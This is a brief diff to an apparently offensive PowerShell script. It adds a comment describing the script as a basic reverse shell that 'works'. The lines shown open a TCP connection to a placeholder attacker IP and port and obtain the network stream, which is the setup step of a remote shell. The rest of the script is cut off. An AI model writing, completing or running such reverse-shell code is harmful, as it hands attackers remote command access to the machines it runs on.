@@ -1,3 +1,5 @@
+# A very basic reverse shell, not the greatest but it works!
+
 $socket = new-object System.Net.Sockets.TcpClient('Attacker IP', PORT);
 if($socket -eq $null){exit 1}
 $stream = $socket.GetStream();
